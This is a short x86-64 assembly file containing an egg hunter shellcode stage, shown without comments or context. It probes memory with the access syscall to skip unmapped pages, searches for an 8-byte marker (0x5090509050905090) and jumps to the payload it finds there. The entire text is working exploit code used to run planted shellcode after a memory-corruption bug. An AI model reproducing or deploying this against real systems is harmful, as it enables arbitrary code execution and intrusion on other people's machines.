global _start

_start:

	xor esi, esi
	lea rdx, [rel $ -10000]
	
_increase1:
	or dx, 0xfff
	
_increase2:
	inc rdx 

_search:
	lea rdi, [rdx + 8]
	push 21 
	pop rax
	syscall
	cmp al, 0xf2
	je _increase1
	mov r12, 0x5090509050905090
	cmp r12, [rdx] 
	jne _increase2
	jmp rdx	



